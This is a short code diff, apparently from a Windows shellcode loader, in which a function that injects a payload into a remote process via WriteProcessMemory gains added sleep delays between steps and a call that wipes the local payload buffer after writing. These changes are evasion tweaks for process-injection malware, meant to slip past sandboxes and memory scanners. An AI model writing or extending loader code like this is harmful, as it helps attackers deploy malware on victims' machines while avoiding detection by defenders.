@@ -32,6 +32,7 @@ MemoryInfo memory_run(LPVOID PayloadAddress, SIZE_T PayloadSize) {
 		memInfo.BytesWrote = 0;
 		return memInfo;
 	}
+	ldr_sleep(g_ldr->config->DelayBetween);
 	SIZE_T BytesWrote = 0;
 	if (!g_ldr->apis->WriteProcessMemory(hProc, addr, PayloadAddress, PayloadSize, &BytesWrote)) {
 		DBGA("[!] Failed Writing Remote Memory | %lu\n", GetLastError());
@@ -47,6 +48,8 @@ MemoryInfo memory_run(LPVOID PayloadAddress, SIZE_T PayloadSize) {
 		memInfo.BytesWrote = 0;
 		return memInfo;
 	}
+	clear_payload(PayloadAddress, PayloadSize);
+	ldr_sleep(g_ldr->config->DelayBetween);
 
 	memInfo.ShellCodeAddress = addr;
 	memInfo.BytesWrote = BytesWrote;
